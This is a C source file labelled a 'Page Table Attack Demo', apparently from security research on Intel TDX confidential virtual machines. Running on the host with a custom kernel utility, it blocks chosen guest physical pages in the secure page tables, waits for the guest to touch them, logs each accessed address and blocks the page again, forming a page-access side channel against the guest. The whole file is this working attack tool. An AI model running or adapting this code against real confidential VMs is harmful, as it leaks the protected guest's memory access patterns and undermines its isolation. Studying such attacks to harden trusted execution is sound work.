// Page Table Attack Demo V1 - Relies on IPA Leaker
// This code demonstrates how to block/unblock a list of guest physical addresses (GPAs) in a TDX environment.
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <poll.h>
#include "../tdxutils/tdxutils.h"

#define CRESET "\033[39m"
#define CGRN "\033[92m"
#define CCYN "\033[96m"

const char loading[] = "|/-\\";

static unsigned char get_gpa_level(int util_fd, unsigned long gpa, unsigned long tdr_pa) {
    union tdx_sept_entry entry;
    unsigned long rc;

    rc = seamcall_tdh_mem_sept_rd(util_fd, 1, gpa & ~((1ul << 21) - 1), tdr_pa, (void*) &entry, NULL);
    if (rc != TDX_SUCCESS) {
        fprintf(stderr, "Error - Could not resolve this GPA! Make sure it is valid.\n");
        exit(EXIT_FAILURE);
    }

    return entry.leaf ? 1 : 0;
}

static int block_single_gpa(int util_fd, unsigned long gpa, unsigned long tdr_pa) {
    unsigned char level = get_gpa_level(util_fd, gpa, tdr_pa);
    struct tdx_gpa_range range = {
        .start = level_align(gpa, level),
        .end = level_align(gpa, level) + level_pg_size(level),
        .tdr_pa = tdr_pa,
        .level = level,
    };

    return ioctl(util_fd, IOCTL_TDX_BLOCK_GPA_RANGE, &range);
}

int main(int argc, char* argv[]) {
    struct pollfd pfd;
    unsigned long access_counter = 0, address_accessed = 0;
    unsigned long tdr_pa;
    int util_fd, status;
    
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <GPA1> <GPA2> <GPA3> ...\n", argv[0]);
        exit(EXIT_SUCCESS);
    }

    int num_gpas = argc - 1;
    unsigned long *gpa = malloc(num_gpas * sizeof(unsigned long));
    if (!gpa) {
        perror("malloc");
        exit(EXIT_FAILURE);
    }
    for (int i = 0; i < num_gpas; i++) {
        char *endptr = NULL;
        gpa[i] = strtoul(argv[i + 1], &endptr, 0);
        if (*endptr != '\0') {
            fprintf(stderr, "Could not parse GPA '%s'. Please give me valid integer in hex.\n", argv[i + 1]);
            free(gpa);
            exit(EXIT_FAILURE);
        }
    }

    util_fd = open("/dev/" TDXUTILS_DEVICE_NAME, O_RDWR);
    if (util_fd < 0) {
        perror("open");
        exit(EXIT_FAILURE);
    }

    tdr_pa = get_tdr_pa(util_fd);

    while (read(util_fd, &address_accessed, sizeof(address_accessed)) > 0) {}
    
    for (int i = 0; i < num_gpas; i++) {
        if (block_single_gpa(util_fd, gpa[i], tdr_pa) < 0) {
            perror("ioctl");
            fprintf(stderr, "Could not block GPA 0x%lx!\n", gpa[i]);
            free(gpa);
            exit(EXIT_FAILURE);
        }
        printf("Blocked the " CCYN "%s" CRESET " page corresponding to GPA " CCYN "0x%lx" CRESET "\n", 
        get_gpa_level(util_fd, gpa[i], tdr_pa) ? "2MB" : "4kB", gpa[i]);
    }

    pfd = (struct pollfd) { .fd = util_fd, .events = POLLIN };
    do {
        // Wait for the page to be accessed
        status = poll(&pfd, 1, 250);
        if (status <= 0)
            continue;

        status = read(util_fd, &address_accessed, sizeof(address_accessed));
        if (status <= 0)
            continue;

        printf("\r" CGRN "Page accessed! GPA was 0x%lx" CRESET "\n", address_accessed);

        // Block the page again
        if (block_single_gpa(util_fd, address_accessed, tdr_pa) < 0)
            break;

        access_counter++;
    } while (status >= 0 && access_counter <= 1000);

    printf("\nStopping here\n");

    if (status < 0) {
        perror("poll/ioctl");
        exit(EXIT_FAILURE);
    }

    return 0;
}
